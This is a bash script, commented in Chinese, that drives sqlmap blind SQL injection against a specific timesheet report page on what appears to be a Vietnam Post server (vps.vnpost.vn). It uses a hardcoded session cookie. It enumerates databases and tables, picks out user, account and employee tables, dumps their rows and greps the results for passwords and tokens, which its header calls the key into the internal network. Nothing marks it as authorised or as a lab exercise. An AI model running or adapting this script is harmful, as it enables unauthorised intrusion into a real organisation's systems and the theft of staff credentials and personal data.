#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 通过SQL盲注提取敏感数据（进内网的钥匙）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "[1] 枚举所有数据库"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --threads=1 \
    --delay=1 \
    --dbs \
    -v 0 \
    2>&1 | tee databases.txt

echo ""
echo "  发现的数据库:"
grep "available databases" -A 20 databases.txt | grep "\[*\]" | tail -15

echo ""
echo "[2] 枚举NSTL数据库的所有表"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --threads=1 \
    --delay=1 \
    -D NSTL \
    --tables \
    -v 0 \
    2>&1 | tee tables.txt

echo ""
echo "  发现的表:"
grep "Database: NSTL" -A 100 tables.txt | grep "\[*\]" | head -30

echo ""
echo "[3] 查找用户/账号相关表"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  关键表（如果存在）:"
grep -iE "user|account|admin|login|auth|member|employee|nhanvien|taikhoan" tables.txt

# 提取表名
USER_TABLES=$(grep -iE "user|account|admin|login|auth|member|employee|nhanvien|taikhoan" tables.txt | grep -oE "\| [A-Za-z_0-9]+ " | sed 's/|//' | tr -d ' ')

if [ -n "$USER_TABLES" ]; then
    echo ""
    echo "  找到用户相关表: $USER_TABLES"
    
    # 选择第一个表
    FIRST_TABLE=$(echo "$USER_TABLES" | head -1)
    
    echo ""
    echo "[4] 导出用户表数据: $FIRST_TABLE"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        -D NSTL \
        -T "$FIRST_TABLE" \
        --dump \
        --start=1 \
        --stop=50 \
        -v 0 \
        2>&1 | tee "dump_${FIRST_TABLE}.txt"
    
    echo ""
    echo "  数据:"
    grep -A 100 "Database: NSTL" "dump_${FIRST_TABLE}.txt" | head -60
else
    echo "  ❌ 未找到明显的用户表"
fi

echo ""
echo "[5] 搜索所有表名（寻找敏感表）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  所有表列表:"
grep "Database: NSTL" -A 200 tables.txt | grep "| " | grep -v "Database:" | head -50 | tee all_tables_list.txt

echo ""
echo "[6] 导出前3个表的数据（盲猜）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 提取前3个表名
TABLE_LIST=$(grep "| " all_tables_list.txt | head -3 | sed 's/|//g' | tr -d ' ')

for table in $TABLE_LIST; do
    echo ""
    echo "  导出表: $table"
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        -D NSTL \
        -T "$table" \
        --dump \
        --start=1 \
        --stop=10 \
        -v 0 \
        2>&1 | tee "dump_${table}.txt"
    
    echo "  数据预览:"
    tail -30 "dump_${table}.txt"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 数据提取完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 提取到的敏感数据:"
ls -lh dump_*.txt 2>/dev/null | awk '{print $9, $5}'

echo ""
echo "🔍 查找密码/凭证:"
grep -iE "password|pass|pwd|matkhau|credential|token" dump_*.txt 2>/dev/null | head -20
